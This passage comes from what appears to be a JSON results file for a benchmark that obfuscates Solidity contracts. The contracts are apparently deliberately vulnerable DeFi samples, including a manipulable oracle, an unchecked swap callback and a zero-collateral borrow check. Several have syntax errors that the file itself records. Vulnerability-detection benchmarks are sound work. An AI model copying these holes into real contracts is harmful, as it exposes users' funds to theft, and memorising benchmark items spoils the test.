_0x12b19c = (_0x316263 * _0x7a51c2) / _0xdf64bf;\n\n        _0xa996b7[msg.sender] -= _0x316263;\n        _0xdf64bf -= _0x316263;\n\n        _0xa46ae9.transfer(_0x8ddbda, _0x14c86c);\n        _0x8aa45e.transfer(_0x8ddbda, _0x12b19c);\n    }\n\n    function _0x0f6dd9() external {\n        _0x36c00a(_0xb5b31f._0x33dc53);\n\n        _0xec2b7b(\n            _0xa46ae9._0xa996b7(address(this)),\n            _0x8aa45e._0xa996b7(address(this))\n        );\n    }\n\n    function _0xec2b7b(uint256 _0x14c86c, uint256 _0x12b19c) internal {}\n\n    function _0x36c00a(uint128 _0x33dc53) internal {}\n}\n",
      "rename_map": {
        "sqrtPriceLimitX96": "_0x469a3a",
        "_removeLiquidity": "_0x36c00a",
        "amountSpecified": "_0x659d2f",
        "amount0Current": "_0x557b26",
        "amount1Current": "_0xae7af1",
        "_addLiquidity": "_0xec2b7b",
        "limitPosition": "_0x73c4ea",
        "transferFrom": "_0x07e644",
        "basePosition": "_0xb5b31f",
        "totalSupply": "_0xdf64bf",
        "zeroForOne": "_0x80ee11",
        "recipient": "_0xd8c879",
        "liquidity": "_0x33dc53",
        "balanceOf": "_0xa996b7",
        "tickUpper": "_0xd2f3c9",
        "rebalance": "_0x0f6dd9",
        "tickLower": "_0x918520",
        "deposit0": "_0x7d7f71",
        "withdraw": "_0x677fcd",
        "deposit1": "_0x5e76af",
        "approve": "_0x87f4e8",
        "amount1": "_0x12b19c",
        "amount0": "_0x14c86c",
        "account": "_0x5d13a4",
        "deposit": "_0x12b494",
        "spender": "_0x17cf87",
        "amount": "_0x4b8d21",
        "shares": "_0x316263",
        "total1": "_0x7a51c2",
        "token0": "_0xa46ae9",
        "token1": "_0x8aa45e",
        "total0": "_0xde8a55",
        "flash": "_0xa43daf",
        "pool": "_0x56eb67",
        "swap": "_0xe81c8f",
        "to": "_0x8ddbda"
      },
      "changes": [
        "Renamed 36 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 39, column 12']"
    },
    {
      "original_id": "sn_tc_035",
      "transformed_id": "ss_l4_medium_sn_tc_035",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x9477a4, uint256 _0xc6143a) external returns (bool);\n\n    function _0xcad688(\n        address from,\n        address _0x9477a4,\n        uint256 _0xc6143a\n    ) external returns (bool);\n\n    function _0x7152cb(address _0xbc5590) external view returns (uint256);\n\n    function _0x21584a(address _0x172fbd, uint256 _0xc6143a) external returns (bool);\n}\n\ninterface IERC721 {\n        // Placeholder for future logic\n        // Placeholder for future logic\n    function _0xcad688(address from, address _0x9477a4, uint256 _0xc05600) external;\n\n    function _0x883f66(uint256 _0xc05600) external view returns (address);\n}\n\ncontract WiseLending {\n        bool _flag3 = false;\n        if (false) { revert(); }\n    struct PoolData {\n        uint256 _0xab2a79;\n        uint256 _0x991039;\n        uint256 _0xff132d;\n        uint256 _0xa66a73;\n    }\n\n    mapping(address => PoolData) public _0x6773d0;\n    mapping(uint256 => mapping(address => uint256)) public _0x381c6b;\n    mapping(uint256 => mapping(address => uint256)) public _0xb6b604;\n\n    IERC721 public _0x45111b;\n    uint256 public _0x798e35;\n\n    function _0x201907() external returns (uint256) {\n        uint256 _0x079ad2 = ++_0x798e35;\n        return _0x079ad2;\n    }\n\n    function _0x4017af(\n        uint256 _0x3ed252,\n        address _0x5ff7bc,\n        uint256 _0x63ae4f\n    ) external returns (uint256 _0x8777f1) {\n        IERC20(_0x5ff7bc)._0xcad688(msg.sender, address(this), _0x63ae4f);\n\n        PoolData storage _0x714e56 = _0x6773d0[_0x5ff7bc];\n\n        if (_0x714e56._0x991039 == 0) {\n            _0x8777f1 = _0x63ae4f;\n            _0x714e56._0x991039 = _0x63ae4f;\n        } else {\n            _0x8777f1 =\n                (_0x63ae4f * _0x714e56._0x991039) /\n                _0x714e56._0xab2a79;\n            _0x714e56._0x991039 += _0x8777f1;\n        }\n\n        _0x714e56._0xab2a79 += _0x63ae4f;\n        _0x381c6b[_0x3ed252][_0x5ff7bc] += _0x8777f1;\n\n        return _0x8777f1;\n    }\n\n    function _0xac0b80(\n        uint256 _0x3ed252,\n        address _0x5ff7bc,\n        uint256 _0x320943\n    ) external returns (uint256 _0x67db2c) {\n        require(\n            _0x381c6b[_0x3ed252][_0x5ff7bc] >= _0x320943,\n            \"Insufficient shares\"\n        );\n\n        PoolData storage _0x714e56 = _0x6773d0[_0x5ff7bc];\n\n        _0x67db2c =\n            (_0x320943 * _0x714e56._0xab2a79) /\n            _0x714e56._0x991039;\n\n        _0x381c6b[_0x3ed252][_0x5ff7bc] -= _0x320943;\n        _0x714e56._0x991039 -= _0x320943;\n        _0x714e56._0xab2a79 -= _0x67db2c;\n\n        IERC20(_0x5ff7bc).transfer(msg.sender, _0x67db2c);\n\n        return _0x67db2c;\n    }\n\n    function _0x52c7e3(\n        uint256 _0x3ed252,\n        address _0x5ff7bc,\n        uint256 _0xbd6b25\n    ) external returns (uint256 _0x1f8811) {\n        PoolData storage _0x714e56 = _0x6773d0[_0x5ff7bc];\n\n        _0x1f8811 =\n            (_0xbd6b25 * _0x714e56._0x991039) /\n            _0x714e56._0xab2a79;\n\n        require(\n            _0x381c6b[_0x3ed252][_0x5ff7bc] >= _0x1f8811,\n            \"Insufficient shares\"\n        );\n\n        _0x381c6b[_0x3ed252][_0x5ff7bc] -= _0x1f8811;\n        _0x714e56._0x991039 -= _0x1f8811;\n        _0x714e56._0xab2a79 -= _0xbd6b25;\n\n        IERC20(_0x5ff7bc).transfer(msg.sender, _0xbd6b25);\n\n        return _0x1f8811;\n    }\n\n    function _0xeb5910(\n        uint256 _0x3ed252,\n        address _0x5ff7bc\n    ) external view returns (uint256) {\n        return _0x381c6b[_0x3ed252][_0x5ff7bc];\n    }\n\n    function _0xc7e3bd(address _0x5ff7bc) external view returns (uint256) {\n        return _0x6773d0[_0x5ff7bc]._0xab2a79;\n    }\n}\n",
      "rename_map": {
        "getPositionLendingShares": "_0xeb5910",
        "withdrawExactShares": "_0xac0b80",
        "withdrawExactAmount": "_0x52c7e3",
        "depositExactAmount": "_0x4017af",
        "totalDepositShares": "_0x991039",
        "totalBorrowShares": "_0xff132d",
        "userLendingShares": "_0x381c6b",
        "userBorrowShares": "_0xb6b604",
        "collateralFactor": "_0xa66a73",
        "pseudoTotalPool": "_0xab2a79",
        "lendingPoolData": "_0x6773d0",
        "_withdrawAmount": "_0xbd6b25",
        "withdrawAmount": "_0x67db2c",
        "transferFrom": "_0xcad688",
        "nftIdCounter": "_0x798e35",
        "getTotalPool": "_0xc7e3bd",
        "positionNFTs": "_0x45111b",
        "mintPosition": "_0x201907",
        "shareBurned": "_0x1f8811",
        "shareAmount": "_0x8777f1",
        "_poolToken": "_0x5ff7bc",
        "balanceOf": "_0x7152cb",
        "ownerOf": "_0x883f66",
        "approve": "_0x21584a",
        "_amount": "_0x63ae4f",
        "account": "_0xbc5590",
        "spender": "_0x172fbd",
        "tokenId": "_0xc05600",
        "_shares": "_0x320943",
        "amount": "_0xc6143a",
        "_nftId": "_0x3ed252",
        "nftId": "_0x079ad2",
        "pool": "_0x714e56",
        "to": "_0x9477a4"
      },
      "changes": [
        "Renamed 34 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 28, column 9', 'Syntax error at line 36, column 5', 'Syntax error at line 133, column 1']"
    },
    {
      "original_id": "sn_tc_036",
      "transformed_id": "ss_l4_medium_sn_tc_036",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0xd1b115, uint256 _0x197a99) external returns (bool);\n\n    function _0xeb6c74(\n        address from,\n        address _0xd1b115,\n        uint256 _0x197a99\n    ) external returns (bool);\n\n    function _0xdf27b1(address _0x0807e0) external view returns (uint256);\n\n    function _0x6ce2d6(address _0xcfa128, uint256 _0x197a99) external returns (bool);\n}\n\ninterface IBorrowerOperations {\n        if (false) { revert(); }\n        // Placeholder for future logic\n    function _0xf11c03(address _0x4828c7, bool _0x43216d) external;\n\n    function _0xaf4546(\n        address _0xdba89f,\n        address _0x0807e0,\n        uint256 _0x4d02ca,\n        uint256 _0xf4ac75,\n        uint256 _0x931402,\n        address _0x86c994,\n        address _0x8fe41a\n    ) external;\n\n    function _0x4b3549(address _0xdba89f, address _0x0807e0) external;\n}\n\ninterface ITroveManager {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n    function _0x6b7c7c(\n        address _0xbf1ffd\n    ) external view returns (uint256 _0x71cc8f, uint256 _0x7a1041);\n\n    function _0x11164d(address _0xbf1ffd) external;\n}\n\ncontract MigrateTroveZap {\n    IBorrowerOperations public _0x3de205;\n    address public _0x10cd3f;\n    address public _0x06e4b2;\n\n    constructor(address _0x8470c4, address _0xaef94f, address _0x699771) {\n        _0x3de205 = _0x8470c4;\n        _0x10cd3f = _0xaef94f;\n        _0x06e4b2 = _0x699771;\n    }\n\n    function _0x032626(\n        address _0xdba89f,\n        address _0x0807e0,\n        uint256 _0xa32fff,\n        uint256 _0x190836,\n        uint256 _0xdc808b,\n        address _0x9f2551,\n        address _0xe3e0bc\n    ) external {\n        IERC20(_0x10cd3f)._0xeb6c74(\n            msg.sender,\n            address(this),\n            _0x190836\n        );\n\n        IERC20(_0x10cd3f)._0x6ce2d6(address(_0x3de205), _0x190836);\n\n        _0x3de205._0xaf4546(\n            _0xdba89f,\n            _0x0807e0,\n            _0xa32fff,\n            _0x190836,\n            _0xdc808b,\n            _0x9f2551,\n            _0xe3e0bc\n        );\n\n        IERC20(_0x06e4b2).transfer(msg.sender, _0xdc808b);\n    }\n\n    function _0x839e96(address _0xdba89f, address _0x0807e0) external {\n        _0x3de205._0x4b3549(_0xdba89f, _0x0807e0);\n    }\n}\n\ncontract BorrowerOperations {\n    mapping(address => mapping(address => bool)) public _0x4e19b8;\n    ITroveManager public _0xdba89f;\n\n    function _0xf11c03(address _0x4828c7, bool _0x43216d) external {\n        _0x4e19b8[msg.sender][_0x4828c7] = _0x43216d;\n    }\n\n    function _0xaf4546(\n        address _0x25dd52,\n        address _0x0807e0,\n        uint256 _0x4d02ca,\n        uint256 _0xf4ac75,\n        uint256 _0x931402,\n        address _0x86c994,\n        address _0x8fe41a\n    ) external {\n        require(\n            msg.sender == _0x0807e0 || _0x4e19b8[_0x0807e0][msg.sender],\n            \"Not authorized\"\n        );\n    }\n\n    function _0x4b3549(address _0x25dd52, address _0x0807e0) external {\n        require(\n            msg.sender == _0x0807e0 || _0x4e19b8[_0x0807e0][msg.sender],\n            \"Not authorized\"\n        );\n    }\n}\n",
      "rename_map": {
        "openTroveAndMigrate": "_0x032626",
        "_borrowerOperations": "_0x8470c4",
        "getTroveCollAndDebt": "_0x6b7c7c",
        "setDelegateApproval": "_0xf11c03",
        "borrowerOperations": "_0x3de205",
        "_maxFeePercentage": "_0x4d02ca",
        "_collateralAmount": "_0xf4ac75",
        "maxFeePercentage": "_0xa32fff",
        "collateralAmount": "_0x190836",
        "closeTroveFor": "_0x839e96",
        "_troveManager": "_0x25dd52",
        "transferFrom": "_0xeb6c74",
        "troveManager": "_0xdba89f",
        "_debtAmount": "_0x931402",
        "_isApproved": "_0x43216d",
        "debtAmount": "_0xdc808b",
        "_lowerHint": "_0x8fe41a",
        "_upperHint": "_0x86c994",
        "closeTrove": "_0x4b3549",
        "_borrower": "_0xbf1ffd",
        "balanceOf": "_0xdf27b1",
        "_delegate": "_0x4828c7",
        "liquidate": "_0x11164d",
        "lowerHint": "_0xe3e0bc",
        "upperHint": "_0x9f2551",
        "openTrove": "_0xaf4546",
        "delegates": "_0x4e19b8",
        "approve": "_0x6ce2d6",
        "account": "_0x0807e0",
        "_wstETH": "_0xaef94f",
        "spender": "_0xcfa128",
        "amount": "_0x197a99",
        "_mkUSD": "_0x699771",
        "wstETH": "_0x10cd3f",
        "mkUSD": "_0x06e4b2",
        "debt": "_0x7a1041",
        "coll": "_0x71cc8f",
        "to": "_0xd1b115"
      },
      "changes": [
        "Renamed 38 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 19, column 9', 'Syntax error at line 34, column 1']"
    },
    {
      "original_id": "sn_tc_037",
      "transformed_id": "ss_l4_medium_sn_tc_037",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x908808, uint256 _0xbc03be) external returns (bool);\n\n    function _0x88a3c0(\n        address from,\n        address _0x908808,\n        uint256 _0xbc03be\n    ) external returns (bool);\n\n    function _0x9a2903(address _0xadbc0f) external view returns (uint256);\n\n    function _0x3a616c(address _0xc20b15, uint256 _0xbc03be) external returns (bool);\n}\n\ninterface IAaveOracle {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n    function _0x4166b2(address _0xbbf9c3) external view returns (uint256);\n\n    function _0x33e2a1(\n        address[] calldata _0x5a1287,\n        address[] calldata _0x7f10ac\n    ) external;\n}\n\ninterface ICurvePool {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    function _0x2f8fcb(\n        int128 i,\n        int128 j,\n        uint256 _0xb7131c,\n        uint256 _0xf2e8bd\n    ) external returns (uint256);\n\n    function _0xc7dacb(\n        int128 i,\n        int128 j,\n        uint256 _0xb7131c\n    ) external view returns (uint256);\n\n    function _0x5edbcc(uint256 i) external view returns (uint256);\n}\n\ninterface ILendingPool {\n    function _0x9acfaf(\n        address _0xbbf9c3,\n        uint256 _0xbc03be,\n        address _0xe724f6,\n        uint16 _0x180aad\n    ) external;\n\n    function _0xe23e53(\n        address _0xbbf9c3,\n        uint256 _0xbc03be,\n        uint256 _0x624047,\n        uint16 _0x180aad,\n        address _0xe724f6\n    ) external;\n\n    function _0x7a8a54(\n        address _0xbbf9c3,\n        uint256 _0xbc03be,\n        address _0x908808\n    ) external returns (uint256);\n}\n\ncontract UwuLendingPool is ILendingPool {\n    IAaveOracle public _0x23449a;\n    mapping(address => uint256) public _0x5d1c16;\n    mapping(address => uint256) public _0x80520c;\n    uint256 public constant LTV = 8500;\n    uint256 public constant BASIS_POINTS = 10000;\n\n    function _0x9acfaf(\n        address _0xbbf9c3,\n        uint256 _0xbc03be,\n        address _0xe724f6,\n        uint16 _0x180aad\n    ) external override {\n        IERC20(_0xbbf9c3)._0x88a3c0(msg.sender, address(this), _0xbc03be);\n        _0x5d1c16[_0xe724f6] += _0xbc03be;\n    }\n\n    function _0xe23e53(\n        address _0xbbf9c3,\n        uint256 _0xbc03be,\n        uint256 _0x624047,\n        uint16 _0x180aad,\n        address _0xe724f6\n    ) external override {\n        uint256 _0x8434b7 = _0x23449a._0x4166b2(msg.sender);\n        uint256 _0xc4ccc5 = _0x23449a._0x4166b2(_0xbbf9c3);\n\n        uint256 _0x0f2525 = (_0x5d1c16[msg.sender] * _0x8434b7) /\n            1e18;\n        uint256 _0x7b82e9 = (_0x0f2525 * LTV) / BASIS_POINTS;\n\n        uint256 _0xbafaaf = (_0xbc03be * _0xc4ccc5) / 1e18;\n\n        require(_0xbafaaf <= _0x7b82e9, \"Insufficient collateral\");\n\n        _0x80520c[msg.sender] += _0xbc03be;\n        IERC20(_0xbbf9c3).transfer(_0xe724f6, _0xbc03be);\n    }\n\n    function _0x7a8a54(\n        address _0xbbf9c3,\n        uint256 _0xbc03be,\n        address _0x908808\n    ) external override returns (uint256) {\n        require(_0x5d1c16[msg.sender] >= _0xbc03be, \"Insufficient balance\");\n        _0x5d1c16[msg.sender] -= _0xbc03be;\n        IERC20(_0xbbf9c3).transfer(_0x908808, _0xbc03be);\n        return _0xbc03be;\n    }\n}\n\ncontract CurveOracle {\n    ICurvePool public _0x21021d;\n\n    constructor(address _0xd81940) {\n        _0x21021d = _0xd81940;\n    }\n\n    function _0x4166b2(address _0xbbf9c3) external view returns (uint256) {\n        uint256 _0x39ad4a = _0x21021d._0x5edbcc(0);\n        uint256 _0x5bbe63 = _0x21021d._0x5edbcc(1);\n\n        uint256 _0xb2f875 = (_0x5bbe63 * 1e18) / _0x39ad4a;\n\n        return _0xb2f875;\n    }\n}\n",
      "rename_map": {
        "interestRateMode": "_0x624047",
        "collateralValue": "_0x0f2525",
        "collateralPrice": "_0x8434b7",
        "setAssetSources": "_0x33e2a1",
        "getAssetPrice": "_0x4166b2",
        "referralCode": "_0x180aad",
        "transferFrom": "_0x88a3c0",
        "borrowPrice": "_0xc4ccc5",
        "borrowValue": "_0xbafaaf",
        "onBehalfOf": "_0xe724f6",
        "balanceOf": "_0x9a2903",
        "maxBorrow": "_0x7b82e9",
        "curvePool": "_0x21021d",
        "exchange": "_0x2f8fcb",
        "balance0": "_0x39ad4a",
        "balance1": "_0x5bbe63",
        "withdraw": "_0x7a8a54",
        "deposits": "_0x5d1c16",
        "balances": "_0x5edbcc",
        "approve": "_0x3a616c",
        "sources": "_0x7f10ac",
        "account": "_0xadbc0f",
        "deposit": "_0x9acfaf",
        "spender": "_0xc20b15",
        "borrows": "_0x80520c",
        "amount": "_0xbc03be",
        "min_dy": "_0xf2e8bd",
        "assets": "_0x5a1287",
        "oracle": "_0x23449a",
        "borrow": "_0xe23e53",
        "get_dy": "_0xc7dacb",
        "asset": "_0xbbf9c3",
        "_pool": "_0xd81940",
        "price": "_0xb2f875",
        "dx": "_0xb7131c",
        "to": "_0x908808"
      },
      "changes": [
        "Renamed 36 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 31, column 9', 'Syntax error at line 46, column 1']"
    },
    {
      "original_id": "sn_tc_038",
      "transformed_id": "ss_l4_medium_sn_tc_038",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x6c4ae5, uint256 _0x16ef17) external returns (bool);\n\n    function _0x2c2538(\n        address from,\n        address _0x6c4ae5,\n        uint256 _0x16ef17\n    ) external returns (bool);\n\n    function _0x08057d(address _0x75b729) external view returns (uint256);\n\n    function _0x377fc4(address _0x52c14a, uint256 _0x16ef17) external returns (bool);\n}\n\ninterface IPriceOracle {\n        if (false) { revert(); }\n        // Placeholder for future logic\n    function _0xdf926d(address _0xf1da76) external view returns (uint256);\n}\n\ncontract BlueberryLending {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    struct Market {\n        bool _0x38a3fc;\n        uint256 _0xb18c7a;\n        mapping(address => uint256) _0x04326a;\n        mapping(address => uint256) _0xc2328c;\n    }\n\n    mapping(address => Market) public _0xa995a5;\n    IPriceOracle public _0x304e62;\n\n    uint256 public constant COLLATERAL_FACTOR = 75;\n    uint256 public constant BASIS_POINTS = 100;\n\n    function _0x2a0c9f(\n        address[] calldata _0x1f8133\n    ) external returns (uint256[] memory) {\n        uint256[] memory _0x8f1632 = new uint256[](_0x1f8133.length);\n        for (uint256 i = 0; i < _0x1f8133.length; i++) {\n            _0xa995a5[_0x1f8133[i]]._0x38a3fc = true;\n            _0x8f1632[i] = 0;\n        }\n        return _0x8f1632;\n    }\n\n    function _0x814d2a(address _0xf1da76, uint256 _0x16ef17) external returns (uint256) {\n        IERC20(_0xf1da76)._0x2c2538(msg.sender, address(this), _0x16ef17);\n\n        uint256 _0x1cbf88 = _0x304e62._0xdf926d(_0xf1da76);\n\n        _0xa995a5[_0xf1da76]._0x04326a[msg.sender] += _0x16ef17;\n        return 0;\n    }\n\n    function _0x9d428f(\n        address _0x9f62d4,\n        uint256 _0x365f38\n    ) external returns (uint256) {\n        uint256 _0x98104b = 0;\n\n        uint256 _0x34dd8f = _0x304e62._0xdf926d(_0x9f62d4);\n        uint256 _0x8a1586 = (_0x365f38 * _0x34dd8f) / 1e18;\n\n        uint256 _0xd14ac6 = (_0x98104b * COLLATERAL_FACTOR) /\n            BASIS_POINTS;\n\n        require(_0x8a1586 <= _0xd14ac6, \"Insufficient collateral\");\n\n        _0xa995a5[_0x9f62d4]._0xc2328c[msg.sender] += _0x365f38;\n        IERC20(_0x9f62d4).transfer(msg.sender, _0x365f38);\n\n        return 0;\n    }\n\n    function _0xe5a4d3(\n        address _0xb842c2,\n        address _0x6199f6,\n        uint256 _0x8001d2,\n        address _0xe571d0\n    ) external {}\n}\n\ncontract ManipulableOracle is IPriceOracle {\n    mapping(address => uint256) public _0xf89805;\n\n    function _0xdf926d(address _0xf1da76) external view override returns (uint256) {\n        return _0xf89805[_0xf1da76];\n    }\n\n    function _0xe57bba(address _0xf1da76, uint256 _0x1cbf88) external {\n        _0xf89805[_0xf1da76] = _0x1cbf88;\n    }\n}\n",
      "rename_map": {
        "totalCollateralValue": "_0x98104b",
        "accountCollateral": "_0x04326a",
        "collateralFactor": "_0xb18c7a",
        "collateralToken": "_0xe571d0",
        "accountBorrows": "_0xc2328c",
        "maxBorrowValue": "_0xd14ac6",
        "transferFrom": "_0x2c2538",
        "enterMarkets": "_0x2a0c9f",
        "borrowAmount": "_0x365f38",
        "repayAmount": "_0x8001d2",
        "borrowToken": "_0x9f62d4",
        "borrowPrice": "_0x34dd8f",
        "borrowValue": "_0x8a1586",
        "repayToken": "_0x6199f6",
        "balanceOf": "_0x08057d",
        "liquidate": "_0xe5a4d3",
        "setPrice": "_0xe57bba",
        "borrower": "_0xb842c2",
        "isListed": "_0x38a3fc",
        "getPrice": "_0xdf926d",
        "results": "_0x8f1632",
        "approve": "_0x377fc4",
        "markets": "_0xa995a5",
        "account": "_0x75b729",
        "spender": "_0x52c14a",
        "vTokens": "_0x1f8133",
        "amount": "_0x16ef17",
        "oracle": "_0x304e62",
        "borrow": "_0x9d428f",
        "prices": "_0xf89805",
        "token": "_0xf1da76",
        "price": "_0x1cbf88",
        "mint": "_0x814d2a",
        "to": "_0x6c4ae5"
      },
      "changes": [
        "Renamed 34 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 19, column 9', 'Syntax error at line 22, column 1', 'Syntax error at line 25, column 9']"
    },
    {
      "original_id": "sn_tc_039",
      "transformed_id": "ss_l4_medium_sn_tc_039",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0x0aed65, uint256 _0xb38c23) external returns (bool);\n\n    function _0x125661(\n        address from,\n        address _0x0aed65,\n        uint256 _0xb38c23\n    ) external returns (bool);\n\n    function _0x2484ed(address _0x28da04) external view returns (uint256);\n\n    function _0xc36087(address _0xdc24ef, uint256 _0xb38c23) external returns (bool);\n}\n\ninterface IWETH {\n        // Placeholder for future logic\n        bool _flag2 = false;\n    function _0x75629f() external payable;\n\n    function _0x75a3db(uint256 _0xb38c23) external;\n\n    function _0x2484ed(address _0x28da04) external view returns (uint256);\n}\n\ncontract CowSolver {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n    IWETH public immutable WETH;\n    address public immutable _0x04a0f0;\n\n    constructor(address _0xb92a2a, address _0xc0aa05) {\n        WETH = IWETH(_0xb92a2a);\n        _0x04a0f0 = _0xc0aa05;\n    }\n\n    function _0x55da88(\n        int256 _0x18a1b9,\n        int256 _0xda4623,\n        bytes calldata data\n    ) external payable {\n        (\n            uint256 _0x9da504,\n            address _0xdbe09b,\n            address _0xb24d68,\n            address _0xf3cac5\n        ) = abi._0xb4e374(data, (uint256, address, address, address));\n\n        uint256 _0x806a6c;\n        if (_0x18a1b9 > 0) {\n            _0x806a6c = uint256(_0x18a1b9);\n        } else {\n            _0x806a6c = uint256(_0xda4623);\n        }\n\n        if (_0xb24d68 == address(WETH)) {\n            WETH._0x75a3db(_0x806a6c);\n            payable(_0xf3cac5).transfer(_0x806a6c);\n        } else {\n            IERC20(_0xb24d68).transfer(_0xf3cac5, _0x806a6c);\n        }\n    }\n\n    function _0xbaae65(bytes calldata _0x082388) external {\n        require(msg.sender == _0x04a0f0, \"Only settlement\");\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "uniswapV3SwapCallback": "_0x55da88",
        "executeSettlement": "_0xbaae65",
        "settlementData": "_0x082388",
        "transferFrom": "_0x125661",
        "amount0Delta": "_0x18a1b9",
        "amount1Delta": "_0xda4623",
        "amountToPay": "_0x806a6c",
        "_settlement": "_0xc0aa05",
        "settlement": "_0x04a0f0",
        "recipient": "_0xf3cac5",
        "balanceOf": "_0x2484ed",
        "withdraw": "_0x75a3db",
        "approve": "_0xc36087",
        "account": "_0x28da04",
        "deposit": "_0x75629f",
        "spender": "_0xdc24ef",
        "tokenIn": "_0xb24d68",
        "amount": "_0xb38c23",
        "decode": "_0xb4e374",
        "solver": "_0xdbe09b",
        "_weth": "_0xb92a2a",
        "price": "_0x9da504",
        "to": "_0x0aed65"
      },
      "changes": [
        "Renamed 23 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_040",
      "transformed_id": "ss_l4_medium_sn_tc_040",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function transfer(address _0xd33bd5, uint256 _0x56ddd3) external returns (bool);\n\n    function _0x00e41d(\n        address from,\n        address _0xd33bd5,\n        uint256 _0x56ddd3\n    ) external returns (bool);\n\n    function _0x25e689(address _0x871994) external view returns (uint256);\n\n    function _0x4775d3(address _0x7dac29, uint256 _0x56ddd3) external returns (bool);\n}\n\ninterface IUniswapV3Router {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n    struct ExactInputSingleParams {\n        address _0xc20c03;\n        address _0x315033;\n        uint24 _0x7b9ea3;\n        address _0x02ac92;\n        uint256 _0xd07390;\n        uint256 _0xbea557;\n        uint256 _0x3cf2b9;\n        uint160 _0x077d6b;\n    }\n\n    function _0xd85a76(\n        ExactInputSingleParams calldata _0xea8e40\n    ) external payable returns (uint256 _0xbc321f);\n}\n\ncontract BedrockVault {\n        // Placeholder for future logic\n        bool _flag4 = false;\n    IERC20 public immutable _0xb4ba92;\n    IERC20 public immutable WBTC;\n    IUniswapV3Router public immutable _0x388cb4;\n\n    uint256 public _0x9ed7a7;\n    uint256 public _0x88b7fe;\n\n    constructor(address _0x5716c4, address _0x235f77, address _0xb0f7d6) {\n        if (gasleft() > 0) { _0xb4ba92 = IERC20(_0x5716c4); }\n        if (1 == 1) { WBTC = IERC20(_0x235f77); }\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x388cb4 = IUniswapV3Router(_0xb0f7d6); }\n    }\n\n    function _0x0e6f76() external payable {\n        require(msg.value > 0, \"No ETH sent\");\n\n        uint256 _0x387a0a = msg.value;\n\n        _0x9ed7a7 += msg.value;\n        _0x88b7fe += _0x387a0a;\n\n        _0xb4ba92.transfer(msg.sender, _0x387a0a);\n    }\n\n    function _0x1f0f8a(uint256 _0x56ddd3) external {\n        require(_0x56ddd3 > 0, \"No amount specified\");\n        require(_0xb4ba92._0x25e689(msg.sender) >= _0x56ddd3, \"Insufficient balance\");\n\n        _0xb4ba92._0x00e41d(msg.sender, address(this), _0x56ddd3);\n\n        uint256 _0xd253d7 = _0x56ddd3;\n        require(address(this).balance >= _0xd253d7, \"Insufficient ETH\");\n\n        payable(msg.sender).transfer(_0xd253d7);\n    }\n\n    function _0x4aca54() external pure returns (uint256) {\n        return 1e18;\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "sqrtPriceLimitX96": "_0x077d6b",
        "totalETHDeposited": "_0x9ed7a7",
        "totalUniBTCMinted": "_0x88b7fe",
        "exactInputSingle": "_0xd85a76",
        "amountOutMinimum": "_0x3cf2b9",
        "getExchangeRate": "_0x4aca54",
        "transferFrom": "_0x00e41d",
        "uniBTCAmount": "_0x387a0a",
        "recipient": "_0x02ac92",
        "balanceOf": "_0x25e689",
        "amountOut": "_0xbc321f",
        "ethAmount": "_0xd253d7",
        "deadline": "_0xd07390",
        "tokenOut": "_0x315033",
        "amountIn": "_0xbea557",
        "approve": "_0x4775d3",
        "_uniBTC": "_0x5716c4",
        "account": "_0x871994",
        "_router": "_0xb0f7d6",
        "spender": "_0x7dac29",
        "tokenIn": "_0xc20c03",
        "amount": "_0x56ddd3",
        "router": "_0x388cb4",
        "uniBTC": "_0xb4ba92",
        "params": "_0xea8e40",
        "redeem": "_0x1f0f8a",
        "_wbtc": "_0x235f77",
        "mint": "_0x0e6f76",
        "fee": "_0x7b9ea3",
        "to": "_0xd33bd5"
      },
      "changes": [
        "Renamed 30 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_041",
      "transformed_id": "ss_l4_medium_sn_tc_041",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
